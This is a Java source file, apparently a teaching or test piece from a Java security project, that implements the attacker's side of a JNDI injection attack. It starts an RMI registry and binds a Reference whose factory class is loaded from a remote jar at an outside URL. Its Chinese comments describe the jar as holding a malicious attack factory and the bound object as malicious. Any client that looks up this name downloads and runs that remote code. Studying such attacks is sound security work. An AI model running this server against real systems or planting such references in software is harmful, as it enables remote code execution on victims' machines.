package com.anbai.sec.jndi.injection;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;

import static com.anbai.sec.rmi.RMIServerTest.RMI_NAME;
import static com.anbai.sec.rmi.RMIServerTest.RMI_PORT;

/**
 * Creator: yz
 * Date: 2019/12/25
 */
public class RMIReferenceServerTest {

	public static void main(String[] args) {
		try {
			// 定义一个远程的jar，jar中包含一个恶意攻击的对象的工厂类
			String url = "https://anbai.io/tools/jndi-test.jar";

			// 对象的工厂类名
			String className = "com.anbai.sec.jndi.injection.ReferenceObjectFactory";

			// 监听RMI服务端口
			LocateRegistry.createRegistry(RMI_PORT);

			// 创建一个远程的JNDI对象工厂类的引用对象
			Reference reference = new Reference(className, className, url);

			// 转换为RMI引用对象
			ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);

			// 绑定一个恶意的Remote对象到RMI服务
			Naming.bind(RMI_NAME, referenceWrapper);

			System.out.println("RMI服务启动成功,服务地址:" + RMI_NAME);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

}
